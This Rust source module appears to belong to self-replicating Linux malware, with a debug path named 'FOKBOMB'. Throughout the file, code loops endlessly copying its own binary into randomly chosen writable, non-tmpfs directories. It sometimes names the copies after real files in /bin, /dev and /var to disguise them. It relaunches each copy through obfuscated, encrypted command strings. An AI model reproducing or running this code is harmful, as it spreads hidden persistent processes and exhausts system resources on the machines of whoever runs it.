use crate::agtools;
use rand::{RngExt, random, random_range};
use std::fs;
use std::fs::{DirEntry, File};
#[cfg(unix)]
use std::os::unix::ffi::OsStrExt;
use std::path::Path;
use walkdir::WalkDir;

pub(crate) fn get_lin_start(startup: &mut String) {
    if !cfg!(debug_assertions) {
        startup.push_str(&get_rnd_dir("/"));
    } else {
        startup.clear();
        startup.push_str("/dev/shm/FOKBOMB");
    };
}

pub(crate) fn l_copy(source: &str, target: &str, child: bool) {
    if !agtools::ensure_dir(target) {
        return;
    }

    let formatter = decrypt_to_string!(LIN_EXEC_FORMATTER);
    loop {
        let f_rnd = random::<u64>();

        let child_name = if f_rnd % 5 == 0 {
            get_rnd_file()
        } else {
            f_rnd.to_string()
        };

        let new_path = format!("{target}/{child_name}");
        agtools::copy_proc(source, &new_path);

        let child_unlock = if child {
            ""
        } else {
            &String::from_utf8(decrypt!(UNLOCK_CHILD)).unwrap()
        };

        let args = sprintf::sprintf!(&formatter, new_path, child_unlock).unwrap();
        agtools::start_proc(&args);

        if !child {
            return;
        }
    }
}

pub(crate) fn get_rnd_dir(dir: &str) -> String {
    let mut selected_dir = String::with_capacity(256);

    let blacklist: &[&[u8]] = &[b"/dev", b"/proc", b"/sys", b"/run", b"/var", b"/bin"];

    let entries = WalkDir::new(dir)
        .max_depth(5)
        .into_iter()
        .filter_entry(|e| {
            #[cfg(unix)]
            let pb = {
                use std::os::unix::ffi::OsStrExt;
                e.path().as_os_str().as_bytes()
            };

            #[cfg(windows)]
            let pb = e.path().to_str().map(|s| s.as_bytes()).unwrap_or(&[]);

            !blacklist.iter().any(|&prefix| pb.starts_with(prefix))
        })
        .filter_map(|e| e.ok());

    for entry in entries {
        let path = entry.path();

        if path.is_dir() && __check_tmpfs(path) && __check_dir(path) {
            if random::<u8>() % 4 == 0 {
                if let Some(p_str) = path.to_str() {
                    selected_dir.push_str(p_str);
                    return selected_dir;
                }
            }
        }
    }

    selected_dir.push_str(dir);
    selected_dir
}

pub(crate) fn get_rnd_file() -> String {
    let dirs: [[u8; 4]; 3] = [*b"/bin", *b"/dev", *b"/var"];
    let mut result = String::new();

    for _dir in dirs {
        let dir: &str = unsafe { std::str::from_utf8_unchecked(&_dir) };

        let os_entries = match fs::read_dir(dir) {
            Ok(f) => f,
            Err(_) => continue,
        };

        let entries: Vec<DirEntry> = match os_entries.collect::<Result<Vec<_>, _>>() {
            Ok(f) => f,
            Err(_) => continue,
        };

        if entries.is_empty() {
            continue;
        }

        let mut rng = rand::rng();
        result = entries[rng.random_range(0..entries.len())]
            .path()
            .into_os_string()
            .into_string()
            .unwrap();
    }

    result
}

fn __check_dir<P: AsRef<Path>>(path: P) -> bool {
    let test_file = path.as_ref().join(format!(
        ".{}{}",
        random_range(97..123) as u8 as char,
        random::<u32>()
    ));
    match File::create(&test_file) {
        Ok(_) => {
            let _ = fs::remove_file(test_file);
            true
        }
        Err(_) => false,
    }
}

fn __check_tmpfs(path: &Path) -> bool {
    #[cfg(unix)]
    unsafe {
        let mut stats: libc::statfs = std::mem::zeroed();
        let c_path = std::ffi::CString::new(path.as_os_str().as_bytes()).unwrap_or_default();

        if libc::statfs(c_path.as_ptr(), &mut stats) == 0 {
            return stats.f_type as u32 != 0x01021994;
        }
    }

    true
}
